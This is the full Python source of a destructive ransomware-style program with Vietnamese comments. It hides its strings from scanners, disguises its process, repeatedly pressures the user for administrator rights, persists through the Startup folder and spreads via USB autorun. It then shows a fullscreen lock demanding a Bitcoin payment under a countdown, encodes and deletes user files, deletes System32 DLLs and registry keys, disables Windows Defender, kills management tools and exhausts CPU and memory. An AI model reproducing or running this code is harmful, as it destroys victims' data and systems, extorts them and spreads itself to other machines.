import time
import os
import sys
import base64
import asyncio
import psutil
import platform
import subprocess
import hashlib
import shutil
import tempfile
import random
import threading
import warnings
import string

try:
    import tkinter as tk
    from tkinter import messagebox
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False

# Tắt cảnh báo
warnings.filterwarnings("ignore")
memory_log = []  # Giữ log trong bộ nhớ, không ghi ra file

# Mật khẩu dừng
STOP_PASSWORD_HASH = hashlib.sha512(b"!@Dungnhon2025").hexdigest()
FAILED_ATTEMPTS = 0
MAX_ATTEMPTS = 1
TIME_LIMIT = 300  # 5 phút
START_TIME = time.time()

# Thông tin cơ bản
SESSION_ID = base64.b64encode(os.urandom(32)).decode()
TROLL_RUNNING = False

# Kiểm tra kiến trúc hệ thống
IS_64BIT = platform.architecture()[0] == '64bit'

# Mã hóa chuỗi nâng cao để tránh phát hiện tĩnh
def obfuscate_string(s):
    encoded = base64.b64encode(s.encode()).decode()
    return ''.join(chr(ord(c) ^ 0x1F) for c in encoded)

def deobfuscate_string(s):
    decoded = ''.join(chr(ord(c) ^ 0x1F) for c in s)
    return base64.b64decode(decoded).decode()

# Chuỗi quan trọng được mã hóa
OBFUSCATED_MESSAGES = {
    "system_alert": obfuscate_string("SYSTEM SECURITY ALERT\nPLEASE ALLOW ADMINISTRATOR ACCESS"),
    "warning": obfuscate_string("WARNING: DENYING ACCESS IS NOT ALLOWED"),
    "locked": obfuscate_string("SYSTEM LOCKED\nENTER PASSWORD\nONE CHANCE ONLY"),
    "destroyed": obfuscate_string("ALL YOUR DATA IS GONE! PAY 1 BITCOIN NOW!"),
    "time_left": obfuscate_string("TIME LEFT: 05:00"),
    "time_warning": obfuscate_string("WARNING: SYSTEM WILL BE DESTROYED IN 5 MINUTES"),
}

# Kiểm tra quyền admin
def is_admin():
    try:
        if platform.system() == "Windows":
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin()
        else:
            return os.geteuid() == 0
    except Exception as e:
        memory_log.append(f"Error checking admin: {e}")
        return False

# Yêu cầu quyền admin và chờ xác nhận
def request_admin_privileges():
    global TROLL_RUNNING
    if platform.system() == "Windows":
        if not is_admin():
            memory_log.append("Requesting admin rights")
            if GUI_AVAILABLE:
                while not TROLL_RUNNING:
                    show_permission_prompt()
            else:
                while not TROLL_RUNNING:
                    run_terminal_permission_prompt()
        else:
            memory_log.append("Running with admin privileges")
            TROLL_RUNNING = True
    else:
        TROLL_RUNNING = True

# Ẩn tiến trình
def hide_process():
    try:
        if platform.system() == "Windows":
            import ctypes
            fake_names = [f"svchost_{random.randint(1000, 9999)}.exe", f"explorer_{random.randint(1000, 9999)}.exe", f"cmd_{random.randint(1000, 9999)}.exe"]
            ctypes.windll.kernel32.SetConsoleTitleW(random.choice(fake_names))
            psutil.Process().nice(psutil.IDLE_PRIORITY_CLASS)
            memory_log.append("Process hidden with random system-like name")
    except Exception as e:
        memory_log.append(f"Error hiding process: {e}")

# Giao diện yêu cầu quyền admin
def show_permission_prompt():
    global TROLL_RUNNING
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.configure(bg='#000000')
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    # Chặn tất cả phím trừ các phím cần thiết
    for key in ['<Control-Alt-Delete>', '<Alt-F4>', '<Escape>', '<Tab>', '<Shift - F10>']:
        root.bind(key, lambda e: None)
    root.bind_all('<Key>', lambda e: destroy_everything_and_exit() if e.keysym not in ['Return', 'BackSpace'] else None)

    tk.Label(root, text=deobfuscate_string(OBFUSCATED_MESSAGES["system_alert"]),
             font=("Arial", 40, "bold"), fg="red", bg="#000000").pack(pady=20)
    tk.Label(root, text=deobfuscate_string(OBFUSCATED_MESSAGES["warning"]),
             font=("Arial", 20), fg="yellow", bg="#000000").pack(pady=10)

    def on_allow():
        global TROLL_RUNNING
        TROLL_RUNNING = True
        import ctypes
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        root.destroy()

    def on_deny():
        root.destroy()  # Đóng cửa sổ, nhưng sẽ mở lại do vòng lặp

    tk.Button(root, text="ALLOW", command=on_allow,
              font=("Arial", 30, "bold"), bg="green", fg="white", width=10).pack(pady=20)
    tk.Button(root, text="DENY", command=on_deny,
              font=("Arial", 30, "bold"), bg="red", fg="white", width=10).pack(pady=20)
    root.mainloop()

def run_terminal_permission_prompt():
    global TROLL_RUNNING
    while not TROLL_RUNNING:
        print(deobfuscate_string(OBFUSCATED_MESSAGES["system_alert"]))
        choice = input("Grant admin access? (y/n): ").strip().lower()
        if choice == 'y':
            TROLL_RUNNING = True
            import ctypes
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            break
        else:
            print("Access denied. Prompt will repeat...")

# Tự chạy và ngụy trang
def autorun():
    try:
        temp_dir = os.path.join(os.getenv('TEMP', tempfile.gettempdir()))
        script_path = os.path.join(temp_dir, f"{''.join(random.choices(string.ascii_lowercase, k=8))}.exe")
        shutil.copy(sys.executable, script_path)
        subprocess.Popen([script_path], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, creationflags=0x08000000)
        memory_log.append(f"Autorun: Copied to {script_path}")
        # Không xóa file tạm để đảm bảo chạy lại sau khởi động
    except Exception as e:
        memory_log.append(f"Error in autorun: {e}")

# Thêm vào startup
def add_to_startup():
    try:
        if platform.system() == "Windows":
            startup_folder = os.path.join(os.getenv('APPDATA', ''), r'Microsoft\Windows\Start Menu\Programs\Startup')
            script_path = os.path.join(startup_folder, f"{''.join(random.choices(string.ascii_lowercase, k=8))}.exe")
            shutil.copy(sys.executable, script_path)
            memory_log.append(f"Added to startup: {script_path}")
    except Exception as e:
        memory_log.append(f"Error adding to startup: {e}")

# Lây lan qua USB
def usb_propagation():
    def monitor_usb():
        known_drives = set()
        while TROLL_RUNNING:
            try:
                drives = psutil.disk_partitions()
                for drive in drives:
                    drive_path = drive.mountpoint
                    if 'removable' not in drive.opts.lower() or drive_path in known_drives:
                        continue
                    known_drives.add(drive_path)
                    virus_path = os.path.join(drive_path, f"{''.join(random.choices(string.ascii_lowercase, k=8))}.exe")
                    shutil.copy(sys.executable, virus_path)
                    autorun_path = os.path.join(drive_path, "autorun.inf")
                    with open(autorun_path, "w") as f:
                        f.write(f"[AutoRun]\nopen={os.path.basename(virus_path)}\n")
                    memory_log.append(f"Spread to USB: {drive_path}")
                time.sleep(random.uniform(5, 10))
            except Exception as e:
                memory_log.append(f"Error in USB propagation: {e}")
    threading.Thread(target=monitor_usb, daemon=True).start()

# Tăng tải CPU và RAM
def overload_cpu_and_memory():
    try:
        def cpu_stress():
            while TROLL_RUNNING:
                for _ in range(random.randint(50, 100)):
                    _ = [i**2 for i in range(1000)]
                time.sleep(random.uniform(2, 5))

        def memory_hog():
            memory = []
            while TROLL_RUNNING:
                try:
                    memory.append(' ' * 10**5)
                    time.sleep(random.uniform(2, 5))
                except:
                    break

        for _ in range(psutil.cpu_count() // 2):
            threading.Thread(target=cpu_stress, daemon=True).start()
        threading.Thread(target=memory_hog, daemon=True).start()
        memory_log.append("CPU and memory overload started")
    except Exception as e:
        memory_log.append(f"Error overloading CPU/memory: {e}")

# Mã hóa và phá hủy tệp
async def encrypt_and_destroy_files():
    root_dirs = ["C:\\"] if platform.system() == "Windows" else ["/"]
    for root_dir in root_dirs:
        if not os.path.exists(root_dir):
            continue
        for root, _, files in os.walk(root_dir):
            if any(protected in root for protected in ["Windows", "System", "System32", "System Volume Information"]):
                continue
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    if os.access(file_path, os.W_OK):
                        with open(file_path, "rb") as f:
                            data = f.read()
                        encrypted = base64.b64encode(data)
                        with open(file_path + ".vippro", "wb") as f:
                            f.write(encrypted)
                        os.remove(file_path)
                        memory_log.append(f"Encrypted and deleted: {file_path}")
                    time.sleep(random.uniform(0.1, 0.5))
                except Exception as e:
                    memory_log.append(f"Error encrypting file {file_path}: {e}")

# Phá hủy hệ thống
async def destroy_system():
    try:
        if is_admin() and platform.system() == "Windows":
            reg_base = "HKLM\\SOFTWARE\\Microsoft\\Windows"
            if IS_64BIT:
                reg_base = "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows"
            subprocess.run("del /f /q C:\\Windows\\System32\\*.dll", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run("del /f /q C:\\Windows\\*.ini", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run(f"reg delete {reg_base} /f", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run("reg delete HKLM\\SYSTEM\\CurrentControlSet /f", shell=True, stderr=subprocess.DEVNULL)
            memory_log.append("Deleted critical system files and registry")
    except Exception as e:
        memory_log.append(f"Error destroying system: {e}")

# Vô hiệu hóa bảo mật
async def disable_security_and_recovery():
    try:
        if is_admin() and platform.system() == "Windows":
            subprocess.run("net stop WinDefend MpsSvc wscsvc", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run("sc delete WinDefend", shell=True, stderr=subprocess.DEVNULL)
            memory_log.append("Disabled Windows Defender and security services")
    except Exception as e:
        memory_log.append(f"Error disabling security: {e}")

# Chặn Task Manager và công cụ quản lý
async def block_management_tools():
    try:
        if platform.system() == "Windows":
            forbidden_processes = ["taskmgr", "cmd", "powershell", "regedit", "msconfig"]
            while TROLL_RUNNING:
                for proc in psutil.process_iter(['name']):
                    proc_name = proc.info['name'].lower()
                    if any(proc_name.startswith(p) for p in forbidden_processes):
                        proc.kill()
                        memory_log.append(f"Killed process: {proc_name}")
                await asyncio.sleep(random.uniform(1, 3))
    except Exception as e:
        memory_log.append(f"Error blocking management tools: {e}")

# Quấy rối hệ thống (tạo cửa sổ liên tục)
async def disrupt_system():
    try:
        def play_alert_sound():
            while True:  # Chạy mãi mãi
                try:
                    import winsound
                    winsound.Beep(random.randint(500, 2000), 500)
                except (ImportError, AttributeError):
                    pass
                time.sleep(random.uniform(1, 3))

        threading.Thread(target=play_alert_sound, daemon=True).start()

        if GUI_AVAILABLE:
            async def create_random_windows():
                while True:  # Tạo cửa sổ liên tục
                    try:
                        root = tk.Tk()
                        root.geometry(f"{random.randint(100, 500)}x{random.randint(100, 500)}+{random.randint(0, 1000)}+{random.randint(0, 1000)}")
                        root.configure(bg=random.choice(["red", "black", "blue", "yellow"]))
                        tk.Label(root, text=deobfuscate_string(OBFUSCATED_MESSAGES["destroyed"]),
                                 font=("Arial", random.randint(10, 30), "bold"),
                                 fg="white", bg=root.cget("bg")).pack(pady=10)
                        root.protocol("WM_DELETE_WINDOW", lambda: None)
                        root.update()
                        await asyncio.sleep(random.uniform(0.5, 1))  # Tạo nhanh hơn
                    except Exception as e:
                        memory_log.append(f"Error creating random windows: {e}")

            await create_random_windows()
    except Exception as e:
        memory_log.append(f"Error disrupting system: {e}")

# Hàm phá hủy và thoát
def destroy_everything_and_exit():
    asyncio.create_task(destroy_everything())
    sys.exit(0)

# Giao diện khóa hệ thống
async def lock_system():
    global FAILED_ATTEMPTS, TROLL_RUNNING
    TROLL_RUNNING = True
    memory_log.append("Locking system")

    if not GUI_AVAILABLE:
        memory_log.append("GUI not available, exiting safely")
        sys.exit(1)

    try:
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.configure(bg='#000000')
        root.protocol("WM_DELETE_WINDOW", lambda: None)

        for key in ['<Control-Alt-Delete>', '<Alt-F4>', '<Escape>', '<Tab>']:
            root.bind(key, lambda e: None)
        root.bind_all('<Key>', lambda e: destroy_everything_and_exit() if e.keysym not in ['Return', 'BackSpace'] else None)

        tk.Label(root, text=deobfuscate_string(OBFUSCATED_MESSAGES["locked"]),
                 font=("Arial", 40, "bold"), fg="red", bg="#000000").pack(pady=20)
        tk.Label(root, text=deobfuscate_string(OBFUSCATED_MESSAGES["destroyed"]),
                 font=("Arial", 20), fg="white", bg="#000000").pack()
        timer_label = tk.Label(root, text=deobfuscate_string(OBFUSCATED_MESSAGES["time_left"]),
                               font=("Arial", 30, "bold"), fg="yellow", bg="#000000")
        timer_label.pack()
        tk.Label(root, text=deobfuscate_string(OBFUSCATED_MESSAGES["time_warning"]),
                 font=("Arial", 20), fg="white", bg="#000000").pack()
        password_entry = tk.Entry(root, show="*", font=("Arial", 20), width=20)
        password_entry.pack(pady=20)
        password_entry.focus_set()

        def check_password():
            global FAILED_ATTEMPTS
            password = password_entry.get()
            if hashlib.sha512(password.encode()).hexdigest() == STOP_PASSWORD_HASH:
                TROLL_RUNNING = False
                messagebox.showinfo("Success", "System unlocked!")
                root.destroy()
                sys.exit(0)
            else:
                FAILED_ATTEMPTS += 1
                messagebox.showerror("Error", "Wrong password! System destroyed!")
                asyncio.create_task(destroy_everything())
                sys.exit(0)

        def update_timer():
            if not TROLL_RUNNING:
                return
            elapsed = time.time() - START_TIME
            remaining = TIME_LIMIT - elapsed
            if remaining <= 0:
                asyncio.create_task(destroy_everything())
                sys.exit(0)
            mins, secs = divmod(remaining, 60)
            timer_label.config(text=f"TIME LEFT: {int(mins):02d}:{int(secs):02d}")
            root.after(100, update_timer)

        tk.Button(root, text="UNLOCK", command=check_password,
                  font=("Arial", 20, "bold"), bg="red", fg="white").pack(pady=20)
        update_timer()
        root.mainloop()
    except Exception as e:
        memory_log.append(f"GUI error in lock_system: {e}")
        sys.exit(1)

# Phá hủy mọi thứ
async def destroy_everything():
    tasks = [
        encrypt_and_destroy_files(),
        destroy_system(),
        disable_security_and_recovery(),
        block_management_tools(),
        disrupt_system(),
    ]
    threading.Thread(target=overload_cpu_and_memory, daemon=True).start()
    await asyncio.gather(*tasks)

# Hàm chính
async def main():
    global TROLL_RUNNING
    memory_log.append("Virus started")
    hide_process()
    usb_propagation()
    request_admin_privileges()
    if TROLL_RUNNING:
        memory_log.append("Admin rights granted")
        add_to_startup()
        autorun()
        await lock_system()
        await destroy_everything()
    else:
        memory_log.append("Admin rights denied, prompting again")

# Dữ liệu ngẫu nhiên để thay đổi chữ ký
RANDOM_PADDING = ''.join(random.choices(string.ascii_letters + string.digits, k=2000))

if __name__ == '__main__':
    try:
        if not GUI_AVAILABLE:
            memory_log.append("GUI not available, exiting safely")
            sys.exit(1)
        loop = asyncio.get_event_loop()
        loop.run_until_complete(main())
    except Exception as e:
        memory_log.append(f"Main error: {e}")
        sys.exit(1)